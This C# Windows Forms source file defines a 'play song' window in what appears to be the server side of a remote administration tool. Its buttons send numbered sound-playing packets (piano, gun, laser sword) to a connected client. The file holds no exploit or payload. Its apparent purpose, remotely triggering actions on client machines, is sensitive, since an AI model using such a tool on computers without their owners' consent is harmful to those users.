using Serveur.Controllers.Server;
using System;
using System.Drawing;
using System.IO;
using System.Windows.Forms;

namespace MosaiqueServeur.Views
{
    public partial class FrmPlaySong : Form
    {
        private ClientMosaique _client;

        public FrmPlaySong(ClientMosaique client)
        {
            this._client = client;
            InitializeComponent();
        }

        //PB_1
        private void pb1_Click(object sender, EventArgs e)
        {
            sendPacket(1);
        }
        //PB_2
        private void pb2_Click(object sender, EventArgs e)
        {
            sendPacket(2);
        }
        //PB_3
        private void pbRing_Click(object sender, EventArgs e)
        {
            sendPacket(3);
        }
        //PB_PIANO
        private void pbPiano_Click(object sender, EventArgs e)
        {
            sendPacket(4);
        }
        //PB_5
        private void pb5_Click(object sender, EventArgs e)
        {
            sendPacket(5);
        }
        //PB_6
        private void pb6_Click(object sender, EventArgs e)
        {
            sendPacket(6);
        }
        //PB_7
        private void pb7_Click(object sender, EventArgs e)
        {
            sendPacket(7);
        }
        //PB_GUN
        private void pbGun_Click(object sender, EventArgs e)
        {
            sendPacket(8);
        }
        //PB_LASERSWORD
        private void pbLaserSword_Click(object sender, EventArgs e)
        {
            sendPacket(9);
        }

        #region event
        //1
        private void pb1_MouseHover(object sender, EventArgs e)
        {
            MouseOver(this.pb1);
        }
        private void pb1_MouseLeave(object sender, EventArgs e)
        {
            pb1.Image = Properties.Resources._1;
        }
        //2
        private void pb2_MouseHover(object sender, EventArgs e)
        {
            MouseOver(this.pb2);
        }
        private void pb2_MouseLeave(object sender, EventArgs e)
        {
            pb2.Image = Properties.Resources._2;
        }
        //3
        private void pbRing_MouseHover(object sender, EventArgs e)
        {
            MouseOver(this.pbRing);
        }        
        private void pbRing_MouseLeave(object sender, EventArgs e)
        {
            pbRing.Image = Properties.Resources._3;
        }
        //4
        private void pbPiano_MouseHover(object sender, EventArgs e)
        {
            MouseOver(this.pbPiano);
        }
        private void pbPiano_MouseLeave(object sender, EventArgs e)
        {
            pbPiano.Image = Properties.Resources.piano;
        }
        //5
        private void pb5_MouseHover(object sender, EventArgs e)
        {
            MouseOver(this.pb5);
        }
        private void pb5_MouseLeave(object sender, EventArgs e)
        {
            pb5.Image = Properties.Resources._5;
        }
        //6
        private void pb6_MouseHover(object sender, EventArgs e)
        {
            MouseOver(this.pb6);
        }
        private void pb6_MouseLeave(object sender, EventArgs e)
        {
            pb6.Image = Properties.Resources._6;
        }
        //7
        private void pb7_MouseHover(object sender, EventArgs e)
        {
            MouseOver(this.pb7);
        }
        private void pb7_MouseLeave(object sender, EventArgs e)
        {
            pb7.Image = Properties.Resources._7;
        }
        //8
        private void pbLaserSword_MouseHover(object sender, EventArgs e)
        {
            MouseOver(this.pbLaserSword);
        }
        private void pbLaserSword_MouseLeave(object sender, EventArgs e)
        {
            pbLaserSword.Image = Properties.Resources.saber;
        }
        //9
        private void pbGun_MouseHover(object sender, EventArgs e)
        {
            MouseOver(this.pbGun);
        }
        private void pbGun_MouseLeave(object sender, EventArgs e)
        {
            pbGun.Image = Properties.Resources.gun;
        }
        #endregion

        private void MouseOver(PictureBox pb)
        {
            int width = pb.Image.Width + ((pb.Image.Width * 10) / 100);
            int height = pb.Image.Height + ((pb.Image.Height * 10) / 100);

            Bitmap bmp = new Bitmap(width, height);
            Graphics g = Graphics.FromImage(bmp);
            g.DrawImage(pb.Image, new Rectangle(Point.Empty, bmp.Size));
            pb.Image = bmp;
        }

        private void sendPacket(int i)
        {
            new MosaiqueServeur.Packets.ServerPackets.PlaySong(i).Execute(_client);
        }
    }
}
